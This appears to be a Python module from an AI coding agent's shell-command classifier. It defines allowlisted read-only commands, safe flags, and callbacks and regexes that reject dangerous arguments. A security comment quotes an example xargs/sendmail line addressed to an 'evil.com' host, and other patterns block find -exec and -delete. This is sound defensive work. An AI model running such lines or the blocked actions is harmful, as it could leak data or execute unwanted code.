"""Read-only Bash command allowlist, regex table, and constants.

This file defines local read-only command shapes plus shared constants for git
internal paths, non-creating write commands, and xargs-safe targets. Shared
git/gh/docker/rg/pyright tables live in ``readonly_shared_flags`` and are
registered into the classifier at import time.

``make_regex_for_safe_command`` escapes command names defensively. The current
allowlist uses plain command identifiers, so the escaping is only a guard for
future entries.
"""

from __future__ import annotations

import re
from typing import Callable, Literal, Pattern, TypedDict

FlagArgType = Literal["none", "number", "string", "char", "EOF", "{}"]


class CommandConfig(TypedDict, total=False):
    """Read-only command allowlist entry."""

    safeFlags: dict[str, FlagArgType]
    regex: Pattern[str]
    additional_command_is_dangerous_callback: Callable[[str, list[str]], bool]
    respects_double_dash: bool  # defaults to True


def make_regex_for_safe_command(command: str) -> Pattern[str]:
    """Build the safe-command regex for a simple read-only command.

    Produces ``^<cmd>(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$`` — allows the
    command followed by arguments that don't contain shell metacharacters
    (redirection, substitution, pipe, logical ops, backticks, brace
    expansion, separators, or line-breaks).
    """
    return re.compile(rf"^{re.escape(command)}(?:\s|$)[^<>()$`|{{}}&;\n\r]*$")


# ─────────────────────────────────────────────────────────────────────
#  FD_SAFE_FLAGS
# ─────────────────────────────────────────────────────────────────────

FD_SAFE_FLAGS: dict[str, FlagArgType] = {
    "-h": "none",
    "--help": "none",
    "-V": "none",
    "--version": "none",
    "-H": "none",
    "--hidden": "none",
    "-I": "none",
    "--no-ignore": "none",
    "--no-ignore-vcs": "none",
    "--no-ignore-parent": "none",
    "-s": "none",
    "--case-sensitive": "none",
    "-i": "none",
    "--ignore-case": "none",
    "-g": "none",
    "--glob": "none",
    "--regex": "none",
    "-F": "none",
    "--fixed-strings": "none",
    "-a": "none",
    "--absolute-path": "none",
    # SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess
    # (same pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
    "-L": "none",
    "--follow": "none",
    "-p": "none",
    "--full-path": "none",
    "-0": "none",
    "--print0": "none",
    "-d": "number",
    "--max-depth": "number",
    "--min-depth": "number",
    "--exact-depth": "number",
    "-t": "string",
    "--type": "string",
    "-e": "string",
    "--extension": "string",
    "-S": "string",
    "--size": "string",
    "--changed-within": "string",
    "--changed-before": "string",
    "-o": "string",
    "--owner": "string",
    "-E": "string",
    "--exclude": "string",
    "--ignore-file": "string",
    "-c": "string",
    "--color": "string",
    "-j": "number",
    "--threads": "number",
    "--max-buffer-time": "string",
    "--max-results": "number",
    "-1": "none",
    "-q": "none",
    "--quiet": "none",
    "--show-errors": "none",
    "--strip-cwd-prefix": "none",
    "--one-file-system": "none",
    "--prune": "none",
    "--search-path": "string",
    "--base-directory": "string",
    "--path-separator": "string",
    "--batch-size": "number",
    "--no-require-git": "none",
    "--hyperlink": "string",
    "--and": "string",
    "--format": "string",
}


# ─────────────────────────────────────────────────────────────────────
#  Additional-dangerous callbacks (Implementation: inline arrow functions).
#  Defined BEFORE the dict so reference is resolvable at import time.
# ─────────────────────────────────────────────────────────────────────


def _sed_additional_callback(cmd: str, args: list[str]) -> bool:
    """OpenSpace ``sed`` dangerous-callback — read-only validation.

    Delegates to :func:`sed_validation.sed_additional_dangerous_callback`
    which implements OpenSpace's full 2-pattern allowlist + denylist check.
    Indirection keeps the import local to avoid a circular edge
    (``sed_validation`` → ``shell_parser``; ``readonly_commands`` is
    imported by ``bash_classifier`` which also imports
    ``shell_parser``).
    """
    from .sed_validation import sed_additional_dangerous_callback

    return sed_additional_dangerous_callback(cmd, args)


def _ps_additional_callback(_cmd: str, args: list[str]) -> bool:
    """OpenSpace ``ps`` BSD ``e`` flag rejection.

    OpenSpace checks for BSD-style flag bundles containing ``e``
    (``ps aux e`` / ``ps ex``) — those print environment variables,
    which may leak secrets.  The BSD mode requires the bundle to have
    NO leading dash.  We mirror that logic.
    """
    for a in args:
        if a.startswith("-"):
            continue
        if not a.isalpha():
            continue
        if "e" in a:
            return True
    return False


_DATE_FLAGS_WITH_ARG = frozenset(
    {"-d", "--date", "-r", "--reference", "--iso-8601", "--rfc-3339"}
)


def _date_additional_callback(_cmd: str, args: list[str]) -> bool:
    """OpenSpace ``date`` positional-arg rejection (must start with ``+`` format).

    ``date`` treats any non-flag non-``+`` positional argument as a
    `setdate` attempt (would set the system clock).
    """
    i = 0
    while i < len(args):
        token = args[i]
        if token.startswith("--") and "=" in token:
            i += 1
            continue
        if token.startswith("-"):
            if token in _DATE_FLAGS_WITH_ARG:
                i += 2
            else:
                i += 1
            continue
        if not token.startswith("+"):
            return True
        i += 1
    return False


_HOSTNAME_PATTERN = re.compile(r"^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$")


def _hostname_additional_callback(cmd: str, _args: list[str]) -> bool:
    """OpenSpace ``hostname`` — any positional arg sets the hostname; reject."""
    return not bool(_HOSTNAME_PATTERN.match(cmd))


def _lsof_additional_callback(_cmd: str, args: list[str]) -> bool:
    """OpenSpace ``lsof`` — ``+m`` modifies mount point cache (privileged)."""
    return any(a == "+m" or a.startswith("+m") for a in args)


_TPUT_DANGEROUS_CAPS = frozenset(
    {
        "init", "reset", "rs1", "rs2", "rs3", "is1", "is2", "is3", "iprog",
        "if", "rf", "clear", "flash", "mc0", "mc4", "mc5", "mc5i", "mc5p",
        "pfkey", "pfloc", "pfx", "pfxl", "smcup", "rmcup",
    }
)


def _tput_additional_callback(_cmd: str, args: list[str]) -> bool:
    """OpenSpace ``tput`` — block ``-S`` (read from stdin) and dangerous capability names."""
    flags_with_args = frozenset({"-T"})
    after_dd = False
    i = 0
    while i < len(args):
        token = args[i]
        if token == "--":
            after_dd = True
            i += 1
            continue
        if not after_dd and token.startswith("-"):
            if token == "-S":
                return True
            # bundled short flags, e.g. -xS
            if not token.startswith("--") and len(token) > 2 and "S" in token:
                return True
            if token in flags_with_args:
                i += 2
            else:
                i += 1
            continue
        if token in _TPUT_DANGEROUS_CAPS:
            return True
        i += 1
    return False


# ─────────────────────────────────────────────────────────────────────
#  COMMAND_ALLOWLIST_LOCAL — 23 keys
# ─────────────────────────────────────────────────────────────────────

COMMAND_ALLOWLIST_LOCAL: dict[str, CommandConfig] = {
    "xargs": {
        "safeFlags": {
            "-I": "{}",
            # SECURITY: lowercase `-i` / `-e` deliberately EXCLUDED
            # They use GNU optional-attached-arg (`i::` / `e::`) which mis-aligns
            # with our space-separated parsing and opens code-exec via
            #   echo /usr/sbin/sendmail | xargs -it tail a@evil.com
            # Use uppercase -I / -E (mandatory separate arg) instead.
            "-n": "number",
            "-P": "number",
            "-L": "number",
            "-s": "number",
            "-E": "EOF",
            "-0": "none",
            "-t": "none",
            "-r": "none",
            "-x": "none",
            "-d": "char",
        },
    },
    "file": {
        "safeFlags": {
            "--brief": "none", "-b": "none", "--mime": "none", "-i": "none",
            "--mime-type": "none", "--mime-encoding": "none", "--apple": "none",
            "--check-encoding": "none", "-c": "none", "--exclude": "string",
            "--exclude-quiet": "string", "--print0": "none", "-0": "none",
            "-f": "string", "-F": "string", "--separator": "string",
            "--help": "none", "--version": "none", "-v": "none",
            "--no-dereference": "none", "-h": "none", "--dereference": "none",
            "-L": "none", "--magic-file": "string", "-m": "string",
            "--keep-going": "none", "-k": "none", "--list": "none", "-l": "none",
            "--no-buffer": "none", "-n": "none", "--preserve-date": "none",
            "-p": "none", "--raw": "none", "-r": "none", "-s": "none",
            "--special-files": "none", "--uncompress": "none", "-z": "none",
        },
    },
    "sed": {
        "safeFlags": {
            "--expression": "string", "-e": "string", "--quiet": "none",
            "--silent": "none", "-n": "none", "--regexp-extended": "none",
            "-r": "none", "--posix": "none", "-E": "none",
            "--line-length": "number", "-l": "number",
            "--zero-terminated": "none", "-z": "none",
            "--separate": "none", "-s": "none",
            "--unbuffered": "none", "-u": "none",
            "--debug": "none", "--help": "none", "--version": "none",
        },
        "additional_command_is_dangerous_callback": _sed_additional_callback,
    },
    "sort": {
        "safeFlags": {
            "--ignore-leading-blanks": "none", "-b": "none",
            "--dictionary-order": "none", "-d": "none",
            "--ignore-case": "none", "-f": "none",
            "--general-numeric-sort": "none", "-g": "none",
            "--human-numeric-sort": "none", "-h": "none",
            "--ignore-nonprinting": "none", "-i": "none",
            "--month-sort": "none", "-M": "none",
            "--numeric-sort": "none", "-n": "none",
            "--random-sort": "none", "-R": "none",
            "--reverse": "none", "-r": "none",
            "--sort": "string", "--stable": "none", "-s": "none",
            "--unique": "none", "-u": "none",
            "--version-sort": "none", "-V": "none",
            "--zero-terminated": "none", "-z": "none",
            "--key": "string", "-k": "string",
            "--field-separator": "string", "-t": "string",
            "--check": "none", "-c": "none",
            "--check-char-order": "none", "-C": "none",
            "--merge": "none", "-m": "none",
            "--buffer-size": "string", "-S": "string",
            "--parallel": "number", "--batch-size": "number",
            "--help": "none", "--version": "none",
        },
    },
    "man": {
        "safeFlags": {
            "-a": "none", "--all": "none",
            "-d": "none", "-f": "none", "--whatis": "none",
            "-h": "none", "-k": "none", "--apropos": "none",
            "-l": "string", "-w": "none",
            "-S": "string", "-s": "string",
        },
    },
    "help": {
        "safeFlags": {"-d": "none", "-m": "none", "-s": "none"},
    },
    "netstat": {
        "safeFlags": {
            "-a": "none", "-L": "none", "-l": "none", "-n": "none",
            "-f": "string", "-g": "none", "-i": "none", "-I": "string",
            "-s": "none", "-r": "none", "-m": "none", "-v": "none",
        },
    },
    "ps": {
        "safeFlags": {
            "-e": "none", "-A": "none", "-a": "none", "-d": "none",
            "-N": "none", "--deselect": "none", "-f": "none", "-F": "none",
            "-l": "none", "-j": "none", "-y": "none",
            "-w": "none", "-ww": "none", "--width": "number",
            "-c": "none", "-H": "none", "--forest": "none",
            "--headers": "none", "--no-headers": "none",
            "-n": "string", "--sort": "string",
            "-L": "none", "-T": "none", "-m": "none",
            "-C": "string", "-G": "string", "-g": "string",
            "-p": "string", "--pid": "string",
            "-q": "string", "--quick-pid": "string",
            "-s": "string", "--sid": "string",
            "-t": "string", "--tty": "string",
            "-U": "string", "-u": "string", "--user": "string",
            "--help": "none", "--info": "none",
            "-V": "none", "--version": "none",
        },
        "additional_command_is_dangerous_callback": _ps_additional_callback,
    },
    "base64": {
        "respects_double_dash": False,
        "safeFlags": {
            "-d": "none", "-D": "none", "--decode": "none",
            "-b": "number", "--break": "number",
            "-w": "number", "--wrap": "number",
            "-i": "string", "--input": "string",
            "--ignore-garbage": "none",
            "-h": "none", "--help": "none", "--version": "none",
        },
    },
    "grep": {
        "safeFlags": {
            "-e": "string", "--regexp": "string",
            "-f": "string", "--file": "string",
            "-F": "none", "--fixed-strings": "none",
            "-G": "none", "--basic-regexp": "none",
            "-E": "none", "--extended-regexp": "none",
            "-P": "none", "--perl-regexp": "none",
            "-i": "none", "--ignore-case": "none", "--no-ignore-case": "none",
            "-v": "none", "--invert-match": "none",
            "-w": "none", "--word-regexp": "none",
            "-x": "none", "--line-regexp": "none",
            "-c": "none", "--count": "none",
            "--color": "string", "--colour": "string",
            "-L": "none", "--files-without-match": "none",
            "-l": "none", "--files-with-matches": "none",
            "-m": "number", "--max-count": "number",
            "-o": "none", "--only-matching": "none",
            "-q": "none", "--quiet": "none", "--silent": "none",
            "-s": "none", "--no-messages": "none",
            "-b": "none", "--byte-offset": "none",
            "-H": "none", "--with-filename": "none",
            "-h": "none", "--no-filename": "none",
            "--label": "string",
            "-n": "none", "--line-number": "none",
            "-T": "none", "--initial-tab": "none",
            "-u": "none", "--unix-byte-offsets": "none",
            "-Z": "none", "--null": "none",
            "-z": "none", "--null-data": "none",
            "-A": "number", "--after-context": "number",
            "-B": "number", "--before-context": "number",
            "-C": "number", "--context": "number",
            "--group-separator": "string", "--no-group-separator": "none",
            "-a": "none", "--text": "none",
            "--binary-files": "string",
            "-D": "string", "--devices": "string",
            "-d": "string", "--directories": "string",
            "--exclude": "string", "--exclude-from": "string",
            "--exclude-dir": "string", "--include": "string",
            "-r": "none", "--recursive": "none",
            "-R": "none", "--dereference-recursive": "none",
            "--line-buffered": "none",
            "-U": "none", "--binary": "none",
            "--help": "none", "-V": "none", "--version": "none",
        },
    },
    "sha256sum": {
        "safeFlags": {
            "-b": "none", "--binary": "none", "-t": "none", "--text": "none",
            "-c": "none", "--check": "none", "--ignore-missing": "none",
            "--quiet": "none", "--status": "none", "--strict": "none",
            "-w": "none", "--warn": "none", "--tag": "none",
            "-z": "none", "--zero": "none",
            "--help": "none", "--version": "none",
        },
    },
    "sha1sum": {
        "safeFlags": {
            "-b": "none", "--binary": "none", "-t": "none", "--text": "none",
            "-c": "none", "--check": "none", "--ignore-missing": "none",
            "--quiet": "none", "--status": "none", "--strict": "none",
            "-w": "none", "--warn": "none", "--tag": "none",
            "-z": "none", "--zero": "none",
            "--help": "none", "--version": "none",
        },
    },
    "md5sum": {
        "safeFlags": {
            "-b": "none", "--binary": "none", "-t": "none", "--text": "none",
            "-c": "none", "--check": "none", "--ignore-missing": "none",
            "--quiet": "none", "--status": "none", "--strict": "none",
            "-w": "none", "--warn": "none", "--tag": "none",
            "-z": "none", "--zero": "none",
            "--help": "none", "--version": "none",
        },
    },
    "tree": {
        "safeFlags": {
            "-a": "none", "-d": "none", "-l": "none", "-f": "none",
            "-x": "none", "-L": "number",
            # SECURITY: -R REMOVED. `tree -R -H . -L 2 /path` writes 00Tree.html
            # files to every subdir at the depth boundary (L677-690 in OpenSpace notes).
            "-P": "string", "-I": "string",
            "--gitignore": "none", "--gitfile": "string",
            "--ignore-case": "none", "--matchdirs": "none",
            "--metafirst": "none", "--prune": "none",
            "--info": "none", "--infofile": "string",
            "--noreport": "none", "--charset": "string",
            "--filelimit": "number",
            "-q": "none", "-N": "none", "-Q": "none",
            "-p": "none", "-u": "none", "-g": "none", "-s": "none",
            "-h": "none", "--si": "none", "--du": "none",
            "-D": "none", "--timefmt": "string",
            "-F": "none", "--inodes": "none", "--device": "none",
            "-v": "none", "-t": "none", "-c": "none", "-U": "none",
            "-r": "none", "--dirsfirst": "none", "--filesfirst": "none",
            "--sort": "string",
            "-i": "none", "-A": "none", "-S": "none", "-n": "none",
            "-C": "none", "-X": "none", "-J": "none", "-H": "string",
            "--nolinks": "none", "--hintro": "string", "--houtro": "string",
            "-T": "string", "--hyperlink": "none",
            "--scheme": "string", "--authority": "string",
            "--fromfile": "none", "--fromtabfile": "none",
            "--fflinks": "none",
            "--help": "none", "--version": "none",
        },
    },
    "date": {
        "safeFlags": {
            "-d": "string", "--date": "string",
            "-r": "string", "--reference": "string",
            "-u": "none", "--utc": "none", "--universal": "none",
            "-I": "none", "--iso-8601": "string",
            "-R": "none", "--rfc-email": "none",
            "--rfc-3339": "string", "--debug": "none",
            "--help": "none", "--version": "none",
        },
        "additional_command_is_dangerous_callback": _date_additional_callback,
    },
    "hostname": {
        "safeFlags": {
            "-f": "none", "--fqdn": "none", "--long": "none",
            "-s": "none", "--short": "none",
            "-i": "none", "--ip-address": "none",
            "-I": "none", "--all-ip-addresses": "none",
            "-a": "none", "--alias": "none",
            "-d": "none", "--domain": "none",
            "-A": "none", "--all-fqdns": "none",
            "-v": "none", "--verbose": "none",
            "-h": "none", "--help": "none",
            "-V": "none", "--version": "none",
        },
        "regex": _HOSTNAME_PATTERN,
        "additional_command_is_dangerous_callback": _hostname_additional_callback,
    },
    "info": {
        "safeFlags": {
            "-f": "string", "--file": "string",
            "-d": "string", "--directory": "string",
            "-n": "string", "--node": "string",
            "-a": "none", "--all": "none",
            "-k": "string", "--apropos": "string",
            "-w": "none", "--where": "none", "--location": "none",
            "--show-options": "none", "--vi-keys": "none", "--subnodes": "none",
            "-h": "none", "--help": "none",
            "--usage": "none", "--version": "none",
        },
    },
    "lsof": {
        "safeFlags": {
            "-?": "none", "-h": "none", "-v": "none",
            "-a": "none", "-b": "none", "-C": "none", "-l": "none",
            "-n": "none", "-N": "none", "-O": "none", "-P": "none",
            "-Q": "none", "-R": "none", "-t": "none", "-U": "none",
            "-V": "none", "-X": "none",
            "-H": "none", "-E": "none", "-F": "none",
            "-g": "none", "-i": "none", "-K": "none", "-L": "none",
            "-o": "none", "-r": "none", "-s": "none", "-S": "none",
            "-T": "none", "-x": "none",
            "-A": "string", "-c": "string", "-d": "string",
            "-e": "string", "-k": "string", "-p": "string", "-u": "string",
        },
        "additional_command_is_dangerous_callback": _lsof_additional_callback,
    },
    "pgrep": {
        "safeFlags": {
            "-d": "string", "--delimiter": "string",
            "-l": "none", "--list-name": "none",
            "-a": "none", "--list-full": "none",
            "-v": "none", "--inverse": "none",
            "-w": "none", "--lightweight": "none",
            "-c": "none", "--count": "none",
            "-f": "none", "--full": "none",
            "-g": "string", "--pgroup": "string",
            "-G": "string", "--group": "string",
            "-i": "none", "--ignore-case": "none",
            "-n": "none", "--newest": "none",
            "-o": "none", "--oldest": "none",
            "-O": "string", "--older": "string",
            "-P": "string", "--parent": "string",
            "-s": "string", "--session": "string",
            "-t": "string", "--terminal": "string",
            "-u": "string", "--euid": "string",
            "-U": "string", "--uid": "string",
            "-x": "none", "--exact": "none",
            "-F": "string", "--pidfile": "string",
            "-L": "none", "--logpidfile": "none",
            "-r": "string", "--runstates": "string",
            "--ns": "string", "--nslist": "string",
            "--help": "none",
            "-V": "none", "--version": "none",
        },
    },
    "tput": {
        "safeFlags": {
            "-T": "string", "-V": "none", "-x": "none",
            # SECURITY: -S deliberately EXCLUDED from safeFlags (see ).
        },
        "additional_command_is_dangerous_callback": _tput_additional_callback,
    },
    "ss": {
        "safeFlags": {
            "-h": "none", "--help": "none", "-V": "none", "--version": "none",
            "-n": "none", "--numeric": "none",
            "-r": "none", "--resolve": "none",
            "-a": "none", "--all": "none",
            "-l": "none", "--listening": "none",
            "-o": "none", "--options": "none",
            "-e": "none", "--extended": "none",
            "-m": "none", "--memory": "none",
            "-p": "none", "--processes": "none",
            "-i": "none", "--info": "none",
            "-s": "none", "--summary": "none",
            "-4": "none", "--ipv4": "none",
            "-6": "none", "--ipv6": "none",
            "-0": "none", "--packet": "none",
            "-t": "none", "--tcp": "none",
            "-M": "none", "--mptcp": "none",
            "-S": "none", "--sctp": "none",
            "-u": "none", "--udp": "none",
            "-d": "none", "--dccp": "none",
            "-w": "none", "--raw": "none",
            "-x": "none", "--unix": "none",
            "--tipc": "none", "--vsock": "none",
            "-f": "string", "--family": "string",
            "-A": "string", "--query": "string",
            "--socket": "string",
            "-Z": "none", "--context": "none",
            "-z": "none", "--contexts": "none",
            # SECURITY: -N/--net EXCLUDED — performs setns()/unshare().
            "-b": "none", "--bpf": "none",
            "-E": "none", "--events": "none",
            "-H": "none", "--no-header": "none",
            "-O": "none", "--oneline": "none",
            "--tipcinfo": "none", "--tos": "none",
            "--cgroup": "none", "--inet-sockopt": "none",
            # SECURITY: -K/--kill, -D/--diag, -F/--filter EXCLUDED.
        },
    },
    "fd": {"safeFlags": dict(FD_SAFE_FLAGS)},
    "fdfind": {"safeFlags": dict(FD_SAFE_FLAGS)},
}


# ─────────────────────────────────────────────────────────────────────
#  READONLY_COMMANDS
# ─────────────────────────────────────────────────────────────────────

READONLY_COMMANDS: list[str] = [
    # Cross-platform (from EXTERNAL_READONLY_COMMANDS in readOnlyCommandValidation.ts)
    "docker ps", "docker images",
    # Time and date
    "cal", "uptime",
    # File content viewing
    "cat", "head", "tail", "wc", "stat", "strings", "hexdump", "od", "nl",
    # System info
    "id", "uname", "free", "df", "du", "locale", "groups", "nproc",
    # Path information
    "basename", "dirname", "realpath",
    # Text processing
    "cut", "paste", "tr", "column", "tac", "rev", "fold", "expand", "unexpand",
    "fmt", "comm", "cmp", "numfmt",
    # Path information (additional)
    "readlink",
    # File comparison
    "diff",
    # Silence / error creation
    "true", "false",
    # Misc safe
    "sleep", "which", "type", "expr", "test", "getconf", "seq", "tsort", "pr",
]


# ─────────────────────────────────────────────────────────────────────
#  READONLY_COMMAND_REGEXES
# ─────────────────────────────────────────────────────────────────────

READONLY_COMMAND_REGEXES: list[Pattern[str]] = [
    *[make_regex_for_safe_command(cmd) for cmd in READONLY_COMMANDS],
    # Echo without command substitution / variables; allows single-quoted newlines
    # but not unquoted metacharacters.
    re.compile(
        r"^echo(?:\s+(?:'[^']*'|\"[^\"$<>\n\r]*\"|[^|;&`$(){}><#\\!\"'\s]+))*"
        r"(?:\s+2>&1)?\s*$"
    ),
    # Claude CLI help
    re.compile(r"^claude -h$"),
    re.compile(r"^claude --help$"),
    # Git readonly commands handled via COMMAND_ALLOWLIST (read-only validation wiring)
    re.compile(
        r"^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*"
        r"(?:\s|$)\s*$"
    ),
    re.compile(r"^pwd$"),
    re.compile(r"^whoami$"),
    # Anchored version probes — prevent node --run hijack.
    re.compile(r"^node -v$"),
    re.compile(r"^node --version$"),
    re.compile(r"^python --version$"),
    re.compile(r"^python3 --version$"),
    # Misc safe
    re.compile(r"^history(?:\s+\d+)?\s*$"),
    re.compile(r"^alias$"),
    re.compile(r"^arch(?:\s+(?:--help|-h))?\s*$"),
    # Network read-only
    re.compile(r"^ip addr$"),
    re.compile(r"^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$"),
    # jq without file-reading / env flags
    re.compile(
        r"^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests"
        r"|-L\b|--library-path|\benv\b|\$ENV\b))"
        r"(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*"
        r"(?:\s+'[^'`]*'|\s+\"[^\"`]*\"|\s+[^-\s'\"][^\s]*)+\s*$"
    ),
    # cd
    re.compile(r"^cd(?:\s+(?:'[^']*'|\"[^\"]*\"|[^\s;|&`$(){}><#\\]+))?$"),
    # ls
    re.compile(r"^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$"),
    # find — blocks -delete / -exec / -execdir / -ok / -okdir / -fprint*.
    re.compile(
        r"^find(?:\s+(?:\\[()]"
        r"|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b"
        r"|-fprint0?\b|-fls\b|-fprintf\b)"
        r"[^<>()$`|{}&;\n\r\s]|\s)+)?$"
    ),
]


# ─────────────────────────────────────────────────────────────────────
#  GIT_INTERNAL_PATTERNS
# ─────────────────────────────────────────────────────────────────────

GIT_INTERNAL_PATTERNS: list[Pattern[str]] = [
    re.compile(r"^HEAD$"),
    re.compile(r"^objects(?:/|$)"),
    re.compile(r"^refs(?:/|$)"),
    re.compile(r"^hooks(?:/|$)"),
]


# ─────────────────────────────────────────────────────────────────────
#  NON_CREATING_WRITE_COMMANDS
# ─────────────────────────────────────────────────────────────────────

NON_CREATING_WRITE_COMMANDS: set[str] = {"rm", "rmdir", "sed"}


# ─────────────────────────────────────────────────────────────────────
#  SAFE_TARGET_COMMANDS_FOR_XARGS
# ─────────────────────────────────────────────────────────────────────

SAFE_TARGET_COMMANDS_FOR_XARGS: list[str] = [
    "echo", "printf", "wc", "grep", "head", "tail",
]


__all__ = [
    "FlagArgType",
    "CommandConfig",
    "make_regex_for_safe_command",
    "FD_SAFE_FLAGS",
    "COMMAND_ALLOWLIST_LOCAL",
    "READONLY_COMMANDS",
    "READONLY_COMMAND_REGEXES",
    "GIT_INTERNAL_PATTERNS",
    "NON_CREATING_WRITE_COMMANDS",
    "SAFE_TARGET_COMMANDS_FOR_XARGS",
]
